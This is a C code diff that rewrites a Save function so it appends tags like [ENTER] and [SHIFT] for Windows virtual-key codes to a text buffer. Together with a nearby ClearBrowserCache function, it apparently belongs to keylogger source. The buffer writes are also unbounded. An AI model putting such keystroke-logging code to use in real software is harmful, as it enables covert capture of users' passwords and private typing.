@@ -31,12 +31,82 @@ void ClearBrowserCache()
 
 }
 
-void Save(int i, char* input)
+void Save(int key, char* input)
 {
-    char temp[2] = "";
-    temp[0] = i;
-    temp[1] = '\0';
-    strcat(input,temp);
+    if(key == VK_BACK)
+    {
+        strcat(input, "[BackSpace]");
+    }
+
+    else if(key == VK_TAB)
+    {
+        strcat(input, "[TAB]");
+    }
+
+    else if(key == VK_RETURN)
+    {
+        strcat(input, "[ENTER]");
+    }
+
+    else if(key == VK_SHIFT)
+    {
+        strcat(input, "[SHIFT]");
+    }
+
+    else if(key == VK_CONTROL)
+    {
+        strcat(input, "[CTRL]");
+    }
+
+    else if(key == VK_MENU)
+    {
+        strcat(input, "[ALT]");
+    }
+
+    else if(key == VK_CAPITAL)
+    {
+        strcat(input,"[CAPSlOCK]");
+    }
+
+    else if(key == VK_ESCAPE)
+    {
+        strcat(input, "[ESC]");
+    }
+
+    else if(key == VK_SPACE)
+    {
+        strcat(input, "[SPACE]");
+    }
+
+    else if(key == VK_UP)
+    {
+        strcat(input, "[UP Arrow]");
+    }
+
+    else if(key == VK_DOWN)
+    {
+        strcat(input, "[DOWN ARROW]");
+    }
+
+    else if(key == VK_LEFT)
+    {
+        strcat(input, "[LEFT ARROW]");
+    }
+
+    else if(key == VK_RIGHT)
+    {
+        strcat(input, "[RIGHT ARROW]");
+    }
+    /*
+    Add more use cases for keyboard layouts
+    */
+    else
+    {
+        char temp[2] = "";
+        temp[0] = key;
+        temp[1] = '\0';
+        strcat(input,temp);
+    }
 
 }
 
